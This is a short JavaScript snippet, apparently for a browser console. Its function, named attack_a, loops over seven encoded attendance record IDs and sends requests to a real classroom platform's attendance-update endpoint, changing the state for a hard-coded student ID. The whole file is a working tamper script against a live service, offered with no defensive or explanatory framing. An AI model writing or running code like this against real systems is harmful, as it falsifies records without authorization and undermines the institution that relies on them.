xhr = function(){
  /*AJAX*/
  var request = false;
  if(window.XMLHttpRequest) {
    request = new XMLHttpRequest();
  } else if(window.ActiveXObject) {
    try {
      request = new window.ActiveXObject('Microsoft.XMLHTTP');
    } catch(e) {}
  }
  return request;
}();

request = function(method,src,argv,content_type){
  xhr.open(method,src,false);
  if(method=='POST')xhr.setRequestHeader('Content-Type',content_type);
  xhr.send(argv);
  return xhr.responseText;
}

attack_a = function(){
  var arr = ['MDAwMDAwMDAwMLOGy5eH36trhaVyoQ','MDAwMDAwMDAwMLOGx5eH37tqhctyoQ','MDAwMDAwMDAwMLOGvd2GqdGwhrVyoQ','MDAwMDAwMDAwMLOGuZmGubdohNtyoQ','MDAwMDAwMDAwMLOGtZSHudGxhrVyoQ','MDAwMDAwMDAwMLOGsd6HqatphKVyoQ','MDAwMDAwMDAwMLOGqZmH37NohLVyoQ'];
  var j, x;
  var argv_0 = "";
  for(j = 0; j < arr.length; j++) {
    x = arr[j];
    var src = "https://www.ketangpai.com/AttenceApi/updateState?studentid=MDAwMDAwMDAwMLOsuZiIuadthrVyoQ&attenceid=" + x +"&state=0";
    request("GET",src,argv_0,"application/x-www-form-urlencoded");
  } 
}

attack_a();
